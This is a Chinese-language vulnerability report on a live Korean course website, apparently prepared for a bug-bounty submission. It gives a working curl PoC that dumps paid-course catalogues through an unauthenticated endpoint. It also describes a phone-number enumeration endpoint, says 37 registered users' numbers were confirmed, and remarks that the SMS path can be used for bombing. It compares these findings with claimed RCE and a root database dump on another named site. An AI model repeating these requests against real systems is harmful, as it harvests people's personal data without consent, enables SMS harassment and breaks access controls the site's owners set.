# us-campus.co.kr 数据泄露专项报告（deep21）

**目标**: https://us-campus.co.kr/product/academy2026_u  
**探测时间**: 2026-07-11  
**结论**: **未发现数据库拖库级泄露**；但确认 **大规模课程元数据未授权泄露** + **37 个已注册手机号枚举** + **5 个平台账号邮箱**

---

## 一、重大发现：未授权批量泄露课程目录（低~中危）

### 漏洞接口

```
POST /study/contentsList
参数: id=<menu_id>&code=FAQ
无需登录
```

### 危害

遍历 `menu_id` 1380~1428，可批量拉取 **38 个产品菜单**、**347 条课程文章** 的：

- `articleCode`（雪花 ID，如 `260310170448414773`）
- 韩文课程标题（如 `[14강] 매니저의 자금 관리: 최적의 현금 보유 비중은 얼마인가?`）
- 章节结构（PART1/PART2、공지사항 等）

### PoC

```bash
curl -sk -X POST https://us-campus.co.kr/study/contentsList \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "id=1383&code=FAQ"
```

返回 JSON 中 `contentsList` 含完整 HTML 目录，内含 `STUDY.article('260310170448414773')` 及课程标题。

### 样本（menu_id=1383，实전투자 스터디）

| articleCode | 标题 |
|-------------|------|
| 260310170448414773 | [14강] 매니저의 자금 관리... |
| 260310170249740620 | [13강] 변동성 장세 대응 전략 |
| 260310170216234825 | [12강] 차트로 보는 주식 이야기 |

### 限制

- `articleContent` / 视频正文 **仍需登录**（返回 `로그인이 필요한 기능입니다`）
- 泄露的是 **付费课程目录与标题元数据**，不是视频文件本身

### 产出

- `deep21_course_catalog.json` — 38 菜单完整目录
- `deep21_articles_full.json` — 347 条 articleCode + 标题

## 二、手机号批量枚举（中危，可报）

### 接口

```
GET  /member/join          # 拿 Session
POST /member/cellphoneCert
参数: countryCode=82&cellphone=010xxxxxxxx
Header: Referer: https://us-campus.co.kr/member/join
```

### 响应差异

| 状态 | 韩文响应 | 含义 |
|------|----------|------|
| 已注册 | `이미 회원가입이 되신 번호입니다` | **平台已有账号** |
| 未注册 | `success` + 发短信 | 可轰炸 |

## 七、与 biobasebaby 对比

| | us-campus | biobasebaby |
|--|-----------|-------------|
| 最高数据危害 | 37 手机号枚举 + 347 课程目录 | RCE + 数据库 root 拖库 |
| 明文 PII 批量 | 仅枚举存在性，无姓名/邮箱批量导出 | 手机号/邮箱/留言明文 |
| 补天定级上限 | 中危 | 高危 |

**实话**：us-campus 数据面没有数据库级突破，但 **37 个手机号枚举 + 347 条课程目录未授权泄露** 已是本轮最大成果，可作为「用户手机号枚举」+「业务数据未授权访问」两条报。
